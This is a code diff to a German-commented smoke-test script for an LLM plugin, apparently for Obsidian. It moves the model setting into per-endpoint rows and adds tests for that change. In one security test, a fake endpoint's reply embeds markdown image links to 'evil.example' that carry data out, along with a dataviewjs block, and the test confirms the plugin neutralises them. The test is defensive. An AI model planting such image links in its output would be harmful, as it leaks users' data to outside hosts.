@@ -486,6 +486,14 @@ async function abschnittMigration(cdp: Cdp): Promise<void> {
       ? `data.json: llm.apiKey ${platte.llm?.apiKey === undefined ? "fehlt" : "ist noch da"}, ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel · Schluesselbund: ${Object.keys(bund).filter((i) => i.startsWith(EP_SECRET_PREFIX)).length} Zeilen-Eintrag/-Eintraege, alter Einzel-Eintrag ${LEGACY_SECRET_ID in bund ? "unangetastet" : "(war nicht gesetzt)"}`
       : `kein Schluesselbund (< 1.11.4) — ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel`,
   );
+  // Welle 17: das globale Modell (`llm.model`, Altwert „qwen3-30b“) ist abgeschafft. Es wandert beim Laden
+  // einmal in jede Zeile ohne Modell; der Schluessel verlaesst Speicher UND Platte.
+  record(
+    "B9 Altwert llm.model wandert in die Zeilen, der Schluessel verschwindet (Speicher und data.json)",
+    eps.length === 2 && eps.every((e) => (e as { model?: string }).model === BESTAND_030.llm.model)
+      && !("model" in llm) && !("model" in (platte.llm ?? {})),
+    `Modelle der Zeilen: ${JSON.stringify(eps.map((e) => (e as { model?: string }).model ?? null))} · llm.model im Speicher: ${"model" in llm} · auf der Platte: ${"model" in (platte.llm ?? {})}`,
+  );
 }
 
 /** C — Bild-Sektion im Settings-Modal (Handover-Schritte 3, 6, 9). */
@@ -499,6 +507,17 @@ async function abschnittSettings(cdp: Cdp, port: number, workflowFixture: string
     ui ? `Bild-Sektion sichtbar (${ui.eigenesFenster ? "eigenes Fenster, ab 1.13" : "Modal, bis 1.12"})` : "Tab-Inhalt in keinem Fenster gefunden",
   );
   if (!ui) return;
+
+  // Welle 17: keine eigene Zeile „Modell“ mehr, keine Option „global model“ in einer Auswahl.
+  const modellUi = await ui.cdp.evaluate<{ zeile: boolean; option: boolean }>(`
+    const names = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + ".setting-item-name")].map((n) => (n.textContent || "").trim().toLowerCase());
+    const opts = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + "select option")].map((o) => (o.textContent || "").toLowerCase());
+    return { zeile: names.some((n) => n === "model" || n === "modell"), option: opts.some((o) => o.includes("global model")) };`);
+  record(
+    "C1b Keine Settings-Zeile „Model“ und keine Option „global model“",
+    !modellUi.zeile && !modellUi.option,
+    `Zeile „Model“: ${modellUi.zeile ? "da" : "fehlt"} · Option „global model“: ${modellUi.option ? "da" : "fehlt"}`,
+  );
 
   const vorher = await bildSektion(ui);
   record(
@@ -1244,10 +1263,10 @@ async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
     await removeFakeManager(cdp);
     fake = await startFakeChatEndpoint(ANFRAGE_MODELL);
     console.log(`  Fake-Endpunkt: ${fake.url} (Modell ${ANFRAGE_MODELL})`);
-    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, request: ${P}.settings.request };`);
+    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, request: ${P}.settings.request };`);
     await cdp.evaluate(`
       const p = ${P};
-      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)} }]; p.settings.llm.model = ${JSON.stringify(ANFRAGE_MODELL)}; p.settings.llm.choice = {};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, model: ${JSON.stringify(ANFRAGE_MODELL)} }]; p.settings.llm.choice = {};
       p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
       p.llm.invalidate(); await p.saveSettings();
       return true;`);
@@ -1318,7 +1337,7 @@ async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
     if (vorher !== null) {
       await cdp.evaluate(`
         const v = ${JSON.stringify(vorher)}; const p = ${P};
-        p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
+        p.settings.llm.endpoints = v.eps;
         if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
         p.settings.request = v.request;
         p.llm.invalidate(); await p.saveSettings();
@@ -1347,6 +1366,7 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
     "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
     "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
     "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
+    "V9 Zeile ohne Modell: das Panel nimmt das erste Modell der Liste und merkt es in der aktiven Zeile (setModel)",
   ];
   const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
   let fake: FakeChatEndpoint | null = null;
@@ -1364,13 +1384,13 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
       return `Echo ${liste.join(" ")}\n\n${pixel}${luecken}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
     });
     console.log(`  Fake-Endpunkt: ${fake.url}`);
-    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
+    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
     // Ein Endpunkt MIT Klartext-Schluessel (ein Staging-Vault ohne Schluessel misst sonst nichts),
     // dann resolve({ force: true }) — erst das migriert in den Schluesselbund und speichert.
     await cdp.evaluate(`
       const p = ${P};
-      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(V_ZEILEN_SCHLUESSEL)} }];
-      p.settings.llm.model = ${JSON.stringify(SCHUTZ_MODELL)}; p.settings.llm.choice = {};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(V_ZEILEN_SCHLUESSEL)}, model: ${JSON.stringify(SCHUTZ_MODELL)} }];
+      p.settings.llm.choice = {};
       p.llm.invalidate();
       await p.llm.resolve({ force: true });
       await new Promise((r) => setTimeout(r, 400));
@@ -1420,6 +1440,19 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
       `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${notiz.includes("![") ? "JA" : "nein"}, Fence mermaid in Datei: ${notiz.includes("```mermaid") ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
     record(NAMEN[7]!, gespeichert && neu.length === 1 && leaf.kopf && pixelVorher === 0 && fake.pixelCalls() === 0,
       `GET /pixel am Fake-Server: ${pixelVorher} vor, ${fake.pixelCalls()} nach dem Speichern`);
+    // V9 (Welle 17): eine Zeile ohne Modell. Das Panel nimmt das erste Modell der Liste und `setModel` schreibt es
+    // in die AKTIVE Zeile — kein globales Feld mehr.
+    await cdp.evaluate(`
+      const p = ${P};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)} }];
+      p.settings.llm.choice = {};
+      p.llm.invalidate(); await p.saveSettings();
+      return true;`);
+    const okV9 = await laufeDeutung(cdp, 20000, "Smoke V9: Zeile ohne Modell");
+    const nachV9 = await cdp.evaluate<{ zeile: string | null; global: boolean }>(`
+      const l = ${P}.settings.llm; return { zeile: l.endpoints[0]?.model ?? null, global: "model" in l };`);
+    record(NAMEN[8]!, okV9 && nachV9.zeile === SCHUTZ_MODELL && !nachV9.global,
+      okV9 ? `Modell der Zeile: ${JSON.stringify(nachV9.zeile)} (erwartet ${JSON.stringify(SCHUTZ_MODELL)}), globales Feld llm.model: ${nachV9.global ? "da" : "fehlt"}` : "Deutungslauf lieferte kein Ergebnis");
   } catch (e) {
     for (const n of NAMEN) if (!checks.some((c) => c.name === n)) skipped(n, `Messung abgebrochen: ${(e as Error).message}`);
   } finally {
@@ -1427,7 +1460,7 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
     if (vorher !== null) {
       await cdp.evaluate(`
         const v = ${JSON.stringify(vorher)}; const p = ${P};
-        p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model; p.settings.defaultOutput = v.out;
+        p.settings.llm.endpoints = v.eps; p.settings.defaultOutput = v.out;
         if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
         p.llm.invalidate(); await p.saveSettings();
         return true;`).catch(() => null);
@@ -1457,14 +1490,14 @@ async function pruefeEchtenEndpunkt(cdp: Cdp): Promise<void> {
   const url = "http://127.0.0.1:1234";
   const modell = await geladenesModell(url);
   if (modell === null) { skipped(name, `auf ${url} ist kein Modell geladen oder der Server antwortet nicht — nichts gemessen (ein Lauf loeste sonst ein JIT-Laden aus)`); return; }
-  const vorher = await cdp.evaluate<{ eps: unknown; model: unknown; choice: unknown; thinking: unknown }>(`
+  const vorher = await cdp.evaluate<{ eps: unknown; choice: unknown; thinking: unknown }>(`
     const l = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm;
     const r = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request;
-    return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, thinking: r.thinking.creative ?? null };`);
+    return { eps: l.endpoints, choice: l.choice ?? null, thinking: r.thinking.creative ?? null };`);
   try {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.settings.llm.endpoints = [{ url: ${JSON.stringify(url)} }]; p.settings.llm.model = ${JSON.stringify(modell)};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(url)}, model: ${JSON.stringify(modell)} }];
       p.settings.llm.choice = {}; p.settings.request.thinking.creative = "off";
       p.llm.invalidate(); await p.saveSettings();
       return true;`);
@@ -1482,7 +1515,7 @@ async function pruefeEchtenEndpunkt(cdp: Cdp): Promise<void> {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
       const v = ${JSON.stringify(vorher)};
-      p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
+      p.settings.llm.endpoints = v.eps;
       if (v.thinking === null) delete p.settings.request.thinking.creative; else p.settings.request.thinking.creative = v.thinking;
       if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
       p.llm.invalidate(); await p.saveSettings();
